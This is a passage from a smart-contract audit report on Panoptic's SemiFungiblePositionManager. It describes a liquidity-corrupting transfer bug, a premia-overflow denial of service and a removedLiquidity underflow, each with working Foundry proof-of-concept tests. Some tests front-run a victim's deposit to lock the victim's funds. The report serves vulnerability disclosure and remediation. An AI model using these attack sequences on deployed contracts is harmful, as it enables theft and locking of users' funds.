- This will disrupt the whole storage updates related to account liquidities.

- Malicious users might transfer a tiny bit of their balance, and cause the recipient to pay much more premium.

- Naive users might unintentionally mess up their accounts.

### Proof of Concept

Down below you can find a coded PoC that proves all scenarios explained above. You can use the protocol's own setup to test this issue:
- Copy and paste the snippet in the `SemiFungiblePositionManager.t.sol` file.

- Run it with `forge test --match-test test_transferpartial -vvv`.

<details>

```solidity
function test_transferpartial() public {
        _initPool(1);
        int24 width = 10; 
        int24 strike = currentTick + 100 - (currentTick % 10); // 10 is tick spacing. We subtract the remaining part, this way strike % tickspacing == 0.
        uint256 positionSizeSeed = 1 ether;

        // Create state with the parameters above.
        populatePositionData(width, strike, positionSizeSeed);
        console2.log("pos size: ", positionSize);
        console2.log("current tick: ", currentTick);

        //--------------------------- MINT BOTH: A SHORT PUT AND A LONG PUT --------------------------------------- 
        // MINTING SHORT PUT-----
        // Construct tokenId for short put.
        uint256 tokenIdforShortPut = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            0,
            1,
            0,
            strike,
            width
        );

        // Mint a short put position with 100% positionSize
        sfpm.mintTokenizedPosition(
            tokenIdforShortPut,
            uint128(positionSize),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        // Alice's account liquidity after first mint will be like this --------------------> removed liq (left slot): 0 | added liq (right slot): liquidity 
        uint256 accountLiquidityAfterFirstMint = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );
        assertEq(accountLiquidityAfterFirstMint.leftSlot(), 0);
        assertEq(accountLiquidityAfterFirstMint.rightSlot(), expectedLiq);

        // MINTING LONG PUT----
        // Construct tokenId for long put -- Same strike same width same token type
        uint256 tokenIdforLongPut = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            1, // isLong true
            1, // token type is the same as above.
            0,
            strike,
            width
        );

        // This time mint but not with whole position size. Use 90% of it.
        sfpm.mintTokenizedPosition(
            tokenIdforLongPut,
            uint128(positionSize * 9 / 10),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        // Account liquidity after the second mint will be like this: ------------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidity
        uint256 accountLiquidityAfterSecondMint = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );
        
        // removed liq 90%, added liq 10%
        // NOTE: there was 1 wei difference due to rounding. That's why ApproxEq is used.
        assertApproxEqAbs(accountLiquidityAfterSecondMint.leftSlot(), expectedLiq * 9 / 10, 1);
        assertApproxEqAbs(accountLiquidityAfterSecondMint.rightSlot(), expectedLiq * 1 / 10, 1);

        // Let's check ERC1155 token balances of Alice.
        // She sould have positionSize amount of short put token, and positionSize*9/10 amount of long put token.
        assertEq(sfpm.balanceOf(Alice, tokenIdforShortPut), positionSize);
        assertEq(sfpm.balanceOf(Alice, tokenIdforLongPut), positionSize * 9 / 10);

        // -------------------------- TRANSFER ONLY 10% TO BOB -----------------------------------------------
        /* During the transfer only the right slot is checked. 
           If the sender account's right slot liquidity is equal to transferred liquidity, transfer is succesfully made regardless of the left slot (as the whole net liquidity is transferred)
        */
        
        // The right side of the Alice's position key is only 10% of liquidity. She can transfer 1/10 of the short put tokens. 
        sfpm.safeTransferFrom(Alice, Bob, tokenIdforShortPut, positionSize * 1 / 10, "");

        // After the transfer, Alice still has positionSize * 9/10 amount of short put tokens and long put tokens.
        // NOTE: There was 1 wei difference due to rounding. That's why used approxEq.
        assertApproxEqAbs(sfpm.balanceOf(Alice, tokenIdforShortPut), positionSize * 9 / 10, 1);
        assertApproxEqAbs(sfpm.balanceOf(Alice, tokenIdforLongPut), positionSize * 9 / 10, 1);
        
        // Bob has positionSize * 1/10 amount of short put tokens.
        assertApproxEqAbs(sfpm.balanceOf(Bob, tokenIdforShortPut), positionSize * 1 / 10, 1);


        // The more problematic thing is that tokens are still in the Alice's wallet but Alice's position key is updated to 0.
        // Bob only got a little tokens but his position key is updated too, and he looks like he removed a lot of liquidity.
        uint256 Alice_accountLiquidityAfterTransfer = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            ); 
        uint256 Bob_accountLiquidityAfterTransfer = sfpm.getAccountLiquidity(
                address(pool),
                Bob,
                1,
                tickLower,
                tickUpper
            );

        assertEq(Alice_accountLiquidityAfterTransfer.leftSlot(), 0);
        assertEq(Alice_accountLiquidityAfterTransfer.rightSlot(), 0);
        
        // Bob's account liquidity is the same as Alice's liq after second mint. 
        // Bob's account looks like he removed tons of liquidity. It will be like this: ---------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidity
        assertEq(Bob_accountLiquidityAfterTransfer.leftSlot(), accountLiquidityAfterSecondMint.leftSlot());
        assertEq(Bob_accountLiquidityAfterTransfer.rightSlot(), accountLiquidityAfterSecondMint.rightSlot());
        console2.log("Bob's account removed liquidity after transfer: ", Bob_accountLiquidityAfterTransfer.leftSlot());

        // -----------------------------------SCENARIO 2-----------------------------------------------
        // ----------------------- ALICE NAIVELY BURNS LONG PUT TOKENS ---------------------------------
        // Alice still had 90 long put and short put tokens. She wants to burn.
        sfpm.burnTokenizedPosition(
            tokenIdforLongPut,
            uint128(positionSize * 9 / 10),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        uint256 Alice_accountLiquidityAfterBurn = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );

        // Her account liquidity left side is enormously big at the moment due to unchecked subtraction in line 979.
        console2.log("Alice's account liquidity left side after burn: ", Alice_accountLiquidityAfterBurn.leftSlot()); 
    }
```

</details>

The result after running the test:

```solidity
Running 1 test for test/foundry/core/SemiFungiblePositionManager.t.sol:SemiFungiblePositionManagerTest
[PASS] test_transferpartial() (gas: 1953904)
Logs:
  Bound Result 1
  Bound Result 1000000000000000000
  pos size:  1009241985705208217
  current tick:  199478
  Bob's account removed liquidity after transfer:  8431372059003199
  Alice's account liquidity left side after burn:  340282366920938463463366176059709208257

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.55s
 
Ran 1 test suite: 1 test passed, 0 failed, 0 skipped (1 total test)
```

### Tools Used

Foundry

### Recommended Mitigation Steps

At the moment, the protocol checks if the whole **net liquidity** is transferred by checking the right slot. However, this restriction is not enough and the situation of the left slot is not checked at all.

The transfer restriction should be widened and users should not be able to transfer if their removed liquidity (left slot) is greater than zero.

### Assessed type

Token-Transfer

**[dyedm1 (Panoptic) confirmed](https://github.com/code-423n4/2023-11-panoptic-findings/issues/256#issuecomment-1859276148)**

***
 
# Medium Risk Findings (5)
## [[M-01] Premia calculation can cause DOS](https://github.com/code-423n4/2023-11-panoptic-findings/issues/520)
*Submitted by [hash](https://github.com/code-423n4/2023-11-panoptic-findings/issues/520)*

1. Attacker can cause DOS for certain addresses.
2. Normal operations can lead to self DOS.

### Proof of Concept

Whenever minting/burning, if the `netLiquidity` and `amountToCollect` are non-zero, the premia calculation is invoked. 

<https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/SemiFungiblePositionManager.sol#L1217>

```solidity
    function _collectAndWritePositionData(
        uint256 liquidityChunk,
        IUniswapV3Pool univ3pool,
        uint256 currentLiquidity,
        bytes32 positionKey,
        int256 movedInLeg,
        uint256 isLong
    ) internal returns (int256 collectedOut) {

        .........

        if (amountToCollect != 0) {
           
            ..........

            _updateStoredPremia(positionKey, currentLiquidity, collectedOut);
        }
```

In case the `removedLiquidity` is high and the `netLiquidity` is extremely low, the calculation in `_getPremiaDeltas` will revert since the calculated amount cannot be cast to `uint128`. 

<https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/SemiFungiblePositionManager.sol#L1280-L1285>

```solidity
    function _getPremiaDeltas(
        uint256 currentLiquidity,
        int256 collectedAmounts
    ) private pure returns (uint256 deltaPremiumOwed, uint256 deltaPremiumGross) {
        
        uint256 removedLiquidity = currentLiquidity.leftSlot();
        uint256 netLiquidity = currentLiquidity.rightSlot();

            uint256 totalLiquidity = netLiquidity + removedLiquidity;

            .........

                premium0X64_base = Math
=>                  .mulDiv(collected0, totalLiquidity * 2 ** 64, netLiquidity ** 2)
                    .toUint128();
```

This can be affected in the following ways:

1. For protocols built of top of SFPM, an attacker can long amounts such that a dust amount of liquidity is left. Following this, when fees get accrued in the position, the amount to collect will become non-zero and will cause the `mints` to revert.

2. Under normal operations, longs/burns of the entire token amount in pieces (i.e. if short was of `posSize` 200 and 2 longs of 100 are made) can also cause dust since liquidity amount will be rounded down in each calculation.

3. An attacker can create such a position himself and transfer this position to another address, following which the transferred address will not be able to mint any tokens in that position.

### Example Scenarios

1. Attacker making:

    For `PEPE/ETH`, an attacker opens a short with `100_000_000e18` PEPE. This gives `> 2 * 71` liquidity and is worth around `$`100. Attacker mints long `100_000_000e18 - 1000` making `netLiquidity` equal to a very small amount and making `removedLiquidity` `> 2 * 71`. Once enough fees are accrued, further mints on this position are disabled for this address.

2.  Dust accrual due to round down:

    Liquidity position ranges:<br>
    - `tickLower` `= 199260`
    - `tickUpper` `= 199290`

    Short amount (`==` token amount):
    - `amount0 = 219738690`
    - `liquidityMinted = 3110442974185905`

    Long amount 1 `== amount0/2 = 109869345`<br>
    Long amount 2 `== amount0/2 = 109869345`<br>
    Liquidity removed `= 1555221487092952 * 2 = 3110442974185904`

    `Dust = 1`

    When the `feeDifference` becomes non-zero (due to increased dust by similar operations/accrual of fees in the range), a similar effect to the earlier scenario will be observed.

### POC Code

Set `fork_block_number = 18706858` and run `forge test --mt testHash_PremiaRevertDueToLowNetHighLiquidity`.

For dust accrual POC run: `forge test --mt testHash_DustLiquidityAmount`

<details>

```diff
diff --git a/test/foundry/core/SemiFungiblePositionManager.t.sol b/test/foundry/core/SemiFungiblePositionManager.t.sol
index 5f09101..e9eef27 100644
--- a/test/foundry/core/SemiFungiblePositionManager.t.sol
+++ b/test/foundry/core/SemiFungiblePositionManager.t.sol
@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import {stdMath} from "forge-std/StdMath.sol";
 import {Errors} from "@libraries/Errors.sol";
 import {Math} from "@libraries/Math.sol";
-import {PanopticMath} from "@libraries/PanopticMath.sol";
+import {PanopticMath,LiquidityChunk} from "@libraries/PanopticMath.sol";
 import {CallbackLib} from "@libraries/CallbackLib.sol";
 import {TokenId} from "@types/TokenId.sol";
 import {LeftRight} from "@types/LeftRight.sol";
@@ -55,7 +55,7 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
     using LeftRight for uint256;
     using LeftRight for uint128;
     using LeftRight for int256;
-
+    using LiquidityChunk for uint256;
     /*//////////////////////////////////////////////////////////////
                            MAINNET CONTRACTS
     //////////////////////////////////////////////////////////////*/
@@ -79,6 +79,7 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
         IUniswapV3Pool(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD);
     IUniswapV3Pool constant USDC_WETH_30 =
         IUniswapV3Pool(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8);
+    IUniswapV3Pool constant PEPE_WETH_30 = IUniswapV3Pool(0x11950d141EcB863F01007AdD7D1A342041227b58);
     IUniswapV3Pool[3] public pools = [USDC_WETH_5, USDC_WETH_5, USDC_WETH_30];
 
     /*//////////////////////////////////////////////////////////////
@@ -189,7 +190,8 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
     /// @notice Set up world state with data from a random pool off the list and fund+approve actors
     function _initWorld(uint256 seed) internal {
         // Pick a pool from the seed and cache initial state
-        _cacheWorldState(pools[bound(seed, 0, pools.length - 1)]);
+        // _cacheWorldState(pools[bound(seed, 0, pools.length - 1)]);
+        _cacheWorldState(PEPE_WETH_30);
 
         // Fund some of the the generic actor accounts
         vm.startPrank(Bob);
@@ -241,6 +243,93 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
         sfpm = new SemiFungiblePositionManagerHarness(V3FACTORY);
     }
 
+    function testHash_PremiaRevertDueToLowNetHighLiquidity() public {
+        _initWorld(0);
+        vm.stopPrank();
+        sfpm.initializeAMMPool(token0, token1, fee);
+
+        deal(token0, address(this), type(uint128).max);
+        deal(token1, address(this), type(uint128).max);
+
+        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
+        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
+
+        int24 strike = ((currentTick / tickSpacing) * tickSpacing) + 3 * tickSpacing;
+        int24 width = 2;
+        int24 lowTick = strike - tickSpacing;
+        int24 highTick = strike + tickSpacing;
+    
+        uint256 shortTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, 0, 0, 0, 0, strike, width);
+
+        uint128 posSize = 100_000_000e18; // gives > 2**71 liquidity ~$100
+
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+
+        uint256 accountLiq = sfpm.getAccountLiquidity(address(PEPE_WETH_30), address(this), 0, lowTick, highTick);
+        
+        assert(accountLiq.rightSlot() > 2 ** 71);
+        
+        // the added liquidity is removed leaving some dust behind
+        uint256 longTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, 0, 1, 0, 0, strike, width);
+        sfpm.mintTokenizedPosition(longTokenId, posSize / 2, type(int24).min, type(int24).max);
+        sfpm.mintTokenizedPosition(longTokenId, posSize / 2 , type(int24).min, type(int24).max);
+
+        // fees is accrued on the position
+        vm.startPrank(Swapper);
+        uint256 amountReceived = router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token1, token0, fee, Bob, block.timestamp, 100e18, 0, 0)
+        );
+        (, int24 tickAfterSwap,,,,,) = pool.slot0();
+        assert(tickAfterSwap > lowTick);
+        
+
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token0, token1, fee, Bob, block.timestamp, amountReceived, 0, 0)
+        );
+        vm.stopPrank();
+
+        // further mints will revert due to amountToCollect being non-zero and premia calculation reverting
+        vm.expectRevert(Errors.CastingError.selector);
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+    }
+
+    function testHash_DustLiquidityAmount() public {
+        int24 tickLower = 199260;
+        int24 tickUpper = 199290;
+
+        /*  
+            amount0 219738690
+            liquidity initial 3110442974185905
+            liquidity withdraw 3110442974185904
+        */
+        
+        uint amount0 = 219738690;
+
+        uint128 liquidityMinted = Math.getLiquidityForAmount0(
+                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
+                amount0
+            );
+
+        // remove liquidity in pieces    
+        uint halfAmount = amount0/2;
+        uint remaining = amount0-halfAmount;
+
+        uint128 liquidityRemoval1 = Math.getLiquidityForAmount0(
+                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
+                halfAmount
+            );
+        uint128 liquidityRemoval2 = Math.getLiquidityForAmount0(
+                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
+                remaining
+            );
+    
+        assert(liquidityMinted - (liquidityRemoval1 + liquidityRemoval2) > 0);
+    }
+
+    function onERC1155Received(address, address, uint256 id, uint256, bytes memory) public returns (bytes4) {
+        return this.onERC1155Received.selector;
+    }
+
```

</details>

### Recommended Mitigation Steps

Modify the premia calculation or use `uint256` for storing premia.

### Assessed type

DoS

**[dyedm1 (Panoptic) confirmed and commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/520#issuecomment-1859636442):**
 > For impact 1 - This is a semi-dup of [#211](https://github.com/code-423n4/2023-11-panoptic-findings/issues/211) (read comment [here](https://github.com/code-423n4/2023-11-panoptic-findings/issues/211#issuecomment-1859249612)) and for the same reason a cap is expected to be followed for removed liquidity. For individual SFPM users, removing their own liquidity with long positions is a bit silly, but users should be aware of the dangers of removing too much. Perhaps we should add a warning to make sure people understand this. The alternative is allowing the premium to overflow which can itself cause issues, but since we never expect it to overflow on cap-implementing protocols that overflow check may not be productive. Still, I would err toward lower impact on that since it is kind of a user error thing though that wouldn't really happen unless you did it on purpose.
> 
> Impact 2 - Is certainly a problem but it is pretty much a dup of [#256](https://github.com/code-423n4/2023-11-panoptic-findings/issues/256) and in fact this specific facet is the only reason why I think 256 can be a High instead of a Med.
> 
> Not sure what the best way to handle this is but I think splitting this up into two issues and combining impact 2 with the duplicates might make the most sense. Ultimately, they are talking about the same issues from different perspectives, so if we keep them separate we have a bunch of very similar issues (none of the 211-related ones except for this seem to be valid issues, but a lot of the valid issues are just various perspectives of 256).

**[Picodes (judge) commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/520#issuecomment-1869810884):**
 > 1 - Would indeed follow the same reasoning as #211 so would be of Low severity.
> 
> However, 2 is a real scenario of self-DoS due to a rounding error leading to an overflow in `_getPremiaDeltas`. I don't see why it'd be a dup of #256 though as #256 is about transfers and here it's more about someone facing an unexpected DoS when minting or burning.

**[dyedm1 (Panoptic) commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/520#issuecomment-1872320402):**
 > @Picodes - Yeah I see that. They're not actually overflowing the `removedLiquidity` so it doesn't involve any of the underlying issues in 256; it just happens to lead to similar impacts. That's fine.

**[osmanozdemir1 (warden) commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/520#issuecomment-1872584959):**
 > @Picodes, I believe this issue deserves to be a medium rather than a high since it can only occur with a few tokens with billions of token supply, or it requires millions of dollars.
> 
> As the author of the submission says, it requires huge amount of transfers. The warden's example in this case is `100_000_000e18` Pepe token. 
> 
> This issue would never occur with USDC or Ethereum, or most of the other regular tokens that will be used in this protocol. It can theoretically occur with 18 decimal stable coins but requires tens of millions of dollars in a single position by a single user.
> 
> Therefore, I think this is a medium severity issue with external requirements.

**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/520#issuecomment-1873421569):**
 > @osmanozdemir1 - thanks for your comment. After consideration, I agree with you on this one. As this is more a DoS, requires external conditions and isn't triggered by an attacker, medium severity seems justified.

***

## [[M-02] `removedLiquidity` can be underflowed to lock other user's deposits](https://github.com/code-423n4/2023-11-panoptic-findings/issues/516)
*Submitted by [hash](https://github.com/code-423n4/2023-11-panoptic-findings/issues/516), also found by [critical-or-high](https://github.com/code-423n4/2023-11-panoptic-findings/issues/332), [0xCiphky](https://github.com/code-423n4/2023-11-panoptic-findings/issues/299), [Udsen](https://github.com/code-423n4/2023-11-panoptic-findings/issues/301), [ptsanev](https://github.com/code-423n4/2023-11-panoptic-findings/issues/148), [Neon2835](https://github.com/code-423n4/2023-11-panoptic-findings/issues/495), [lanrebayode77](https://github.com/code-423n4/2023-11-panoptic-findings/issues/357), and [Topmark](https://github.com/code-423n4/2023-11-panoptic-findings/issues/147)*

1. Attacker can cause deposits of other users to be locked.
2. Attacker can manipulate the `premia` calculated to extremely high levels.

### Proof of Concept

When burning a long token, the `removedLiquidity` is subtracted in an unchecked block.

<https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/SemiFungiblePositionManager.sol#L936-L980>

```solidity
    function _createLegInAMM(
        IUniswapV3Pool _univ3pool,
        uint256 _tokenId,
        uint256 _leg,
        uint256 _liquidityChunk,
        bool _isBurn
    ) internal returns (int256 _moved, int256 _itmAmounts, int256 _totalCollected) {
        
        .............

        unchecked {
           
            .........

            if (isLong == 0) {
               
                updatedLiquidity = startingLiquidity + chunkLiquidity;

                if (_isBurn) {
=>                  removedLiquidity -= chunkLiquidity;
                }
```

An underflow can be produced here by the following (burning is done after transferring the current position):

1. Mint a short token.

2. Mint a long token of same position size to remove the `netLiquidity` added. This is the token that we will burn in order to underflow the `removedAmount`.

3. Use `safeTransferFrom` to clear the current position. By passing in 0 as the token amount, we can move the position to some other address while still retaining the token amounts. This will set the and `removedLiquidity` to 0.

4. Burn the previously minted long token. This will cause the `removedLiquidity` to underflow to `2 ** 128 - prevNetLiquidity` and increase the `netLiquidity`.

5. Burn the previously minted short token. This will set the `netLiquidity` to 0.

The ability to obtain such a position allows an attacker to perform a variety of attacks.

### Lock other user's first time (have liquidity and `feesBase` 0) deposits by front-running

If the `totalLiquidity` of a position is equal to `2 ** 128`, the premia calculation will revert due to division by zero.

<https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/SemiFungiblePositionManager.sol#L1313-L1322>

```solidity
    function _getPremiaDeltas(
        uint256 currentLiquidity,
        int256 collectedAmounts
    ) private pure returns (uint256 deltaPremiumOwed, uint256 deltaPremiumGross) {
        // extract liquidity values
        uint256 removedLiquidity = currentLiquidity.leftSlot();
        uint256 netLiquidity = currentLiquidity.rightSlot();

        unchecked {
            uint256 totalLiquidity = netLiquidity + removedLiquidity;

        ........
    
    // @audit if totalLiquidity == 2 ** 128, sq == 2 ** 256 == 0 since unchecked. mulDiv reverts on division by 0

=>                  premium0X64_gross = Math
                        .mulDiv(premium0X64_base, numerator, totalLiquidity ** 2)
                        .toUint128();
                    premium1X64_gross = Math
                        .mulDiv(premium1X64_base, numerator, totalLiquidity ** 2)
                        .toUint128();
```

An attacker can exploit this by creating a position with `removedLiquidity == 2 ** 128 - depositorLiquidity` and `netLiquidity == 0`. The attacker can then front run and transfer this position to the depositor following which the funds will be lost/locked if burn is attempted without adding more liquidity or fees has been accrued on the position (causable by the attacker).

Instead of matching exactly with `2 ** 128 - depositorLiquidity` an attacker can also keep `removedLiquidity` extremely close to `type(uint128).max`; in which case depending on the depositor's amount, a similar effect will take place due to casting errors.

Another less severe possibility for the attacker is to keep `netLiquidity` slightly above 0 (some other amount which will cause fees collected to be non-zero and hence, invoke the `_getPremiaDeltas`) and transfer to target address causing DOS since any attempt to `mint` will result in revert due to premia calculation.

### Manipulate the premia calculation

Instead of making `totalLiquidity == 2 ** 128`, an attacker can choose values for `netLiquidity` and `removedLiquidity` such that `totalLiquidity > 2 ** 128`. This will disrupt the premia calculation.

Example values:

    uint256 netLiquidity = 92295168568182390522;
    uint128 collected0 = 1000;
    uint256 removedLiquidity = 2 ** 128 - 1000;

    calculated deltaPremiumOwed =  184221893349665448120
    calculated deltaPremiumGross = 339603160599738985487650139090815393758

### POC Code

Set `fork_block_number = 18706858`.

For the division by 0 revert lock run: `forge test --mt testHash_DepositAmountLockDueToUnderflowDenomZero`.

For the casting error revert lock run: `forge test --mt testHash_DepositAmountLockDueToUnderflowCastingError`.

<details>

```diff
diff --git a/test/foundry/core/SemiFungiblePositionManager.t.sol b/test/foundry/core/SemiFungiblePositionManager.t.sol
index 5f09101..f5b6110 100644
--- a/test/foundry/core/SemiFungiblePositionManager.t.sol
+++ b/test/foundry/core/SemiFungiblePositionManager.t.sol
@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import {stdMath} from "forge-std/StdMath.sol";
 import {Errors} from "@libraries/Errors.sol";
 import {Math} from "@libraries/Math.sol";
-import {PanopticMath} from "@libraries/PanopticMath.sol";
+import {PanopticMath,LiquidityChunk} from "@libraries/PanopticMath.sol";
 import {CallbackLib} from "@libraries/CallbackLib.sol";
 import {TokenId} from "@types/TokenId.sol";
 import {LeftRight} from "@types/LeftRight.sol";
@@ -241,6 +241,127 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
         sfpm = new SemiFungiblePositionManagerHarness(V3FACTORY);
     }
 
+    function testHash_DepositAmountLockDueToUnderflowDenomZero() public {
+        _initWorld(0);
+        sfpm.initializeAMMPool(token0, token1, fee);
+
+        int24 strike = (currentTick / tickSpacing * tickSpacing) + 3 * tickSpacing;
+        int24 width = 2;
+
+        uint256 shortTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 0, 0, 0, strike, width);
+        uint256 longTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 1, 0, 0, strike, width);
+
+        // size of position alice is about to deposit
+        uint128 posSize = 1e18;
+        uint128 aliceToGetLiquidity =
+            LiquidityChunk.liquidity(PanopticMath.getLiquidityChunk(shortTokenId, 0, posSize, tickSpacing));
+
+        // front run
+        vm.stopPrank();
+        deal(token0, address(this), type(uint128).max);
+        deal(token1, address(this), type(uint128).max);
+
+        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
+        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
+
+        // mint short and convert it to removed amount by minting a corresponding long
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+        sfpm.mintTokenizedPosition(longTokenId, posSize, type(int24).min, type(int24).max);
+
+        // move these amounts somewhere by passing 0 as the token amount. this will set removedLiquidity and netLiquidity to 0 while still retaining the tokens
+        sfpm.safeTransferFrom(address(this), address(0x1231), longTokenId, 0, "");
+
+        // burn the long position. this will cause underflow and set removedAmount == uint128 max - alice deposit.
+        sfpm.burnTokenizedPosition(longTokenId, posSize, type(int24).min, type(int24).max);
+
+        // the above burn will make the netLiquidity == alice deposit size. if we are to burn the netLiquidity amount now to make it 0, it will cause a revert due to sum being 2**128. hence increase the amount
+        sfpm.mintTokenizedPosition(shortTokenId, 2 * posSize, type(int24).min, type(int24).max);
+
+        // the following pattern is used to burn as directly attempting to burn 3 * posSize would revert due to roudning down performed at the time of minting
+        sfpm.burnTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+        sfpm.burnTokenizedPosition(shortTokenId, 2 * posSize, type(int24).min, type(int24).max);
+
+        uint256 acc =
+            sfpm.getAccountLiquidity(address(pool), address(this), 0, strike - tickSpacing, strike + tickSpacing);
+        assert(acc.rightSlot() == 0);
+        assert(acc.leftSlot() == 2 ** 128 - aliceToGetLiquidity);
+
+        // front-run Alice's deposit
+        sfpm.safeTransferFrom(address(this), Alice, shortTokenId, 0, "");
+        uint256 aliceDepositTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 0, 0, 0, strike, width);
+        vm.prank(Alice);
+        sfpm.mintTokenizedPosition(aliceDepositTokenId, posSize, type(int24).min, type(int24).max);
+
+        // all attempt to withdraw funds by Alice will revert due to division by 0 in premia calculation
+        vm.prank(Alice);
+        vm.expectRevert();
+        sfpm.burnTokenizedPosition(aliceDepositTokenId, posSize, type(int24).min, type(int24).max);
+
+        vm.prank(Alice);
+        vm.expectRevert();
+        sfpm.burnTokenizedPosition(aliceDepositTokenId, posSize / 2 + 1, type(int24).min, type(int24).max);
+    }
+
+    function testHash_DepositAmountLockDueToUnderflowCastingError() public {
+        _initWorld(0);
+        sfpm.initializeAMMPool(token0, token1, fee);
+
+        int24 strike = (currentTick / tickSpacing * tickSpacing) + 3 * tickSpacing;
+        int24 width = 2;
+
+        uint256 shortTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 0, 0, 0, strike, width);
+        uint256 longTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 1, 0, 0, strike, width);
+
+        // low posSize to have the underflowed amount close to max and to round down in uniswap when withdrawing liquidity which will allow us to have netLiquidity of 0
+        uint128 posSize = 1000;
+        vm.stopPrank();
+        deal(token0, address(this), type(uint128).max);
+        deal(token1, address(this), type(uint128).max);
+
+        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
+        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
+
+        // mint short and convert it to removed amount by minting a corresponding long
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+        sfpm.mintTokenizedPosition(longTokenId, posSize, type(int24).min, type(int24).max);
+
+        // move these amounts somewhere by passing 0 as the token amount. this will set removedLiquidity and netLiquidity to 0 while still retaining the tokens
+        sfpm.safeTransferFrom(address(this), address(0x1231), longTokenId, 0, "");
+
+        // burn the long position. this will cause underflow and set removedAmount close to uint128 max. but it will make the netLiquidity non-zero. burn the short position to remove the netLiquidity without increasing removedLiquidity
+        sfpm.burnTokenizedPosition(longTokenId, posSize, type(int24).min, type(int24).max);
+        sfpm.burnTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+
+        uint256 acc =
+            sfpm.getAccountLiquidity(address(pool), address(this), 0, strike - tickSpacing, strike + tickSpacing);
+        assert(acc.rightSlot() == 0);
+        assert(acc.leftSlot() > 2 ** 127);
+
+        // front-run Alice's deposit
+        sfpm.safeTransferFrom(address(this), Alice, shortTokenId, 0, "");
+        uint256 aliceDepositTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, isWETH, 0, 0, 0, strike, width);
+        vm.prank(Alice);
+        sfpm.mintTokenizedPosition(aliceDepositTokenId, 10e18, type(int24).min, type(int24).max);
+
+        // fees accrual in position
+        vm.prank(Swapper);
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token1, token0, fee, Bob, block.timestamp, 1000e18, 0, 0)
+        );
+        (, int24 tickAfterSwap,,,,,) = pool.slot0();
+
+        assert(tickAfterSwap > tickLower);
+
+        // after fees accrual Alice cannot withdraw the amount due to reverting in premia calculation
+        vm.prank(Alice);
+        vm.expectRevert(Errors.CastingError.selector);
+        sfpm.burnTokenizedPosition(aliceDepositTokenId, 10e18, type(int24).min, type(int24).max);
+    }
+
+    function onERC1155Received(address, address, uint256 id, uint256, bytes memory) public returns (bytes4) {
+        return this.onERC1155Received.selector;
+    }
+
```

</details>

### Recommended Mitigation Steps

Check if `removedLiquidity` is greater than `chunkLiquidity` before subtracting.

### Assessed type

Under/Overflow

**[dyedm1 (Panoptic) confirmed, but disagreed with severity and commented via duplicate issue #332](https://github.com/code-423n4/2023-11-panoptic-findings/issues/332#issuecomment-1859312515):**
> This is definitely an issue, but `removedLiquidity` doesn't actually affect the operations of the SFPM - just the optional data exposed by `getAccountPremium` for Panoptic to use. Panoptic only allows exactly the amount of the token you have minted, so you can't combine them or execute this attack on Panoptic. So the impact of this is rather low/med because it only allows you to screw up your own premium calculations, which is not used for anything/doesn't matter unless you're the Panoptic protocol.

**[Picodes (judge) decreased severity to Medium](https://github.com/code-423n4/2023-11-panoptic-findings/issues/516#issuecomment-1869789750)**

